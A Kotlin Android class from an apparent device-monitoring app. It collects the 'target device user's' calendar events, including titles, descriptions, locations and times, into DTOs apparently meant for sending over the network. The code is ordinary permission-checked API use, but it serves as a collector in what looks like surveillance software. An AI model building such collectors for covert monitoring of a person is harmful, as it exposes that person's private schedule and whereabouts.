package com.spapp.monitoring.collectors

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.BaseColumns
import android.provider.CalendarContract
import android.util.Log
import androidx.core.content.ContextCompat
import com.spapp.monitoring.network.CalendarEventEntryDto
import java.time.Instant

/**
 * Collects calendar events marked by the target device user.
 * Queries CalendarContract.Events for non-deleted events with valid start times.
 */
class CalendarCollector(private val context: Context) {

    companion object {
        private const val TAG = "CalendarCollector"
    }

    fun hasPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALENDAR) ==
            PackageManager.PERMISSION_GRANTED

    fun collectAll(limit: Int = 300): List<CalendarEventEntryDto> {
        if (!hasPermission()) return emptyList()

        val results = mutableListOf<CalendarEventEntryDto>()
        val projection = arrayOf(
            BaseColumns._ID,
            CalendarContract.Events.TITLE,
            CalendarContract.Events.DESCRIPTION,
            CalendarContract.Events.EVENT_LOCATION,
            CalendarContract.Events.DTSTART,
            CalendarContract.Events.DTEND,
            CalendarContract.Events.ALL_DAY
        )

        // Filter out deleted events and events without start times
        val selection = "${CalendarContract.Events.DELETED} = 0 AND ${CalendarContract.Events.DTSTART} IS NOT NULL"
        val sortOrder = "${CalendarContract.Events.DTSTART} DESC"

        try {
            context.contentResolver.query(
                CalendarContract.Events.CONTENT_URI,
                projection,
                selection,
                null,
                sortOrder
            )?.use { cursor ->
                val idIdx = cursor.getColumnIndex(BaseColumns._ID)
                val titleIdx = cursor.getColumnIndex(CalendarContract.Events.TITLE)
                val descIdx = cursor.getColumnIndex(CalendarContract.Events.DESCRIPTION)
                val locIdx = cursor.getColumnIndex(CalendarContract.Events.EVENT_LOCATION)
                val startIdx = cursor.getColumnIndex(CalendarContract.Events.DTSTART)
                val endIdx = cursor.getColumnIndex(CalendarContract.Events.DTEND)
                val allDayIdx = cursor.getColumnIndex(CalendarContract.Events.ALL_DAY)

                while (cursor.moveToNext() && results.size < limit) {
                    val id = cursor.getLong(idIdx)
                    val rawTitle = cursor.getString(titleIdx)
                    val rawDesc = cursor.getString(descIdx)
                    val loc = cursor.getString(locIdx)?.trim()?.ifBlank { null }
                    val dtStart = cursor.getLong(startIdx)
                    val dtEnd = if (endIdx >= 0 && !cursor.isNull(endIdx)) cursor.getLong(endIdx) else null
                    val isAllDay = if (allDayIdx >= 0) cursor.getInt(allDayIdx) == 1 else false

                    val title = rawTitle?.trim().orEmpty()
                    val desc = rawDesc?.trim()?.ifBlank { null }

                    // Skip empty/unnamed system entries with no info
                    if (title.isBlank() && desc.isNullOrBlank()) continue

                    val startIso = try {
                        Instant.ofEpochMilli(dtStart).toString()
                    } catch (e: Exception) {
                        continue
                    }
                    val endIso = dtEnd?.let {
                        try {
                            Instant.ofEpochMilli(it).toString()
                        } catch (e: Exception) {
                            null
                        }
                    }

                    results.add(
                        CalendarEventEntryDto(
                            externalId = id.toString(),
                            title = if (title.isBlank()) (desc ?: "Event") else title,
                            description = desc,
                            location = loc,
                            startTime = startIso,
                            endTime = endIso,
                            isAllDay = isAllDay
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to collect calendar events", e)
        }

        return results
    }
}
